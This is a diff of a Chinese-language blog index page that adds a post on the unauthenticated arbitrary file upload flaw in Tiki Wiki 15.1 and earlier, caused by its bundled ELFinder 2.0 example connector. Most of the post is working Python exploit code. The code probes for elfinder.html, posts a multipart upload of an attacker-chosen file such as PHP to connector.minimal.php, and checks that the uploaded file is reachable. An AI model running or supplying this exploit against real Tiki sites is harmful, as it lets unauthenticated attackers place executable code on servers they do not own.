@@ -155,6 +155,84 @@ var _hmt = _hmt || [];
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-Tiki_Wiki_Unauthenticated_File_Upload" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/04/24/Tiki_Wiki_Unauthenticated_File_Upload/">tiki_wiki（&lt;=15.1）任意文件上传漏洞</a>
+    </h1>
+  
+
+        
+        <a href="/2017/04/24/Tiki_Wiki_Unauthenticated_File_Upload/" class="archive-article-date">
+  	<time datetime="2017-04-24T03:29:42.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-04-24</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Tiki-Wiki-lt-15-1-Unauthenticated-File-Upload"><a href="#Tiki-Wiki-lt-15-1-Unauthenticated-File-Upload" class="headerlink" title="Tiki Wiki &lt;=15.1 - Unauthenticated File Upload"></a>Tiki Wiki &lt;=15.1 - Unauthenticated File Upload</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p><strong>利用Tiki利用Tiki Wiki&lt;=15.1中的文件上传漏洞，<br>漏洞来自tiki的第三方组件ELFinder -version 2.0<br>该组件带有一个默认的示例页面：包括上传、删除、重命名、创建目录等<br>并且该页面不强制进行文件扩展名、内容类型等验证。<br>因此，未经身份验证的用户也可以上传PHP文件。</strong></p>
+<h2 id="exp编写"><a href="#exp编写" class="headerlink" title="exp编写"></a>exp编写</h2><h3 id="1-检测漏洞是否存在"><a href="#1-检测漏洞是否存在" class="headerlink" title="1. 检测漏洞是否存在"></a>1. 检测漏洞是否存在</h3><p>使用requests模块，<a href="http://docs.python-requests.org/zh_CN/latest/user/quickstart.html" target="_blank" rel="external">http://docs.python-requests.org/zh_CN/latest/user/quickstart.html</a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(url, port)</span>:</span></div><div class="line">    parts = [<span class="string">'http://'</span>, url, <span class="string">':'</span>, port, <span class="string">'/tiki/vendor_extra/elfinder/elfinder.html'</span>]</div><div class="line">    target_url = <span class="string">''</span>.join(<span class="string">'%s'</span> % part <span class="keyword">for</span> part <span class="keyword">in</span> parts)</div><div class="line">    print(target_url)</div><div class="line">    r = requests.get(target_url)</div><div class="line">    <span class="keyword">if</span> (r.status_code == <span class="number">200</span>):</div><div class="line">        print(<span class="string">"检测成功,开始攻击"</span>)</div><div class="line">        <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        print(<span class="string">"未检测到"</span>)</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div></pre></td></tr></table></figure></p>
+<h3 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h3><ul>
+<li>选择一个php文件上传然后抓包可得：<br><img src="http://onc55v8te.bkt.clouddn.com/blog/20170423/104629854.png" alt="mark"></li>
+<li>据此，使用requests库提交Multipart/form-data格式的数据，查看post部分<br><img src="http://onc55v8te.bkt.clouddn.com/blog/20170423/104720598.png" alt="mark"></li>
+<li><p>据此构造参数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">files = &#123;<span class="string">'cmd'</span>: (<span class="keyword">None</span>, <span class="string">'upload'</span>),</div><div class="line">             <span class="string">'target'</span>: (<span class="keyword">None</span>, <span class="string">'l1_XA'</span>),</div><div class="line">             <span class="string">'upload[]'</span>: (filename, open(filename, <span class="string">'rb'</span>), <span class="string">'application/octet-stream'</span>)</div><div class="line">             &#125;</div></pre></td></tr></table></figure>
+</li>
+<li><p>随后使用post方法提交</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(url, port, filename)</span>:</span></div><div class="line">    parts = [<span class="string">'http://'</span>, url, <span class="string">':'</span>, port, <span class="string">'/tiki/vendor_extra/elfinder/php/connector.minimal.php'</span>]</div><div class="line">    target_url = <span class="string">''</span>.join(<span class="string">'%s'</span> % part <span class="keyword">for</span> part <span class="keyword">in</span> parts)</div><div class="line">    files = &#123;<span class="string">'cmd'</span>: (<span class="keyword">None</span>, <span class="string">'upload'</span>),</div><div class="line">             <span class="string">'target'</span>: (<span class="keyword">None</span>, <span class="string">'l1_XA'</span>),</div><div class="line">             <span class="string">'upload[]'</span>: (filename, open(filename, <span class="string">'rb'</span>), <span class="string">'application/octet-stream'</span>)</div><div class="line">             &#125;</div><div class="line">    r = requests.post(target_url, files=files)</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="3-检测是否上传成功"><a href="#3-检测是否上传成功" class="headerlink" title="3.检测是否上传成功"></a>3.检测是否上传成功</h3><p>如果上传成功，会在/tiki/vendor_extra/elfinder/files/路径下找到上传的文件<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_success</span><span class="params">(url, port, filename)</span>:</span></div><div class="line">    parts = [<span class="string">'http://'</span>, url, <span class="string">':'</span>, port, <span class="string">'/tiki/vendor_extra/elfinder/files/'</span>, filename]</div><div class="line"></div><div class="line">    target_url = <span class="string">''</span>.join(<span class="string">'%s'</span> % part <span class="keyword">for</span> part <span class="keyword">in</span> parts)</div><div class="line">    r = requests.get(target_url)</div><div class="line">    <span class="keyword">if</span> (r.status_code == <span class="number">200</span>):</div><div class="line">        print(<span class="string">"上传成功~"</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        print(<span class="string">"上传失败"</span>)</div></pre></td></tr></table></figure></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">exploit</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2017/04/24/Tiki_Wiki_Unauthenticated_File_Upload/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
     <article id="post-algorithm_sort_1" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -647,6 +725,14 @@ b&apos;We copy you down, Eagle.\n&apos;
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">hello</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">exploit</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">Web</a>
               </li>
             
             <div class="clearfix"></div>
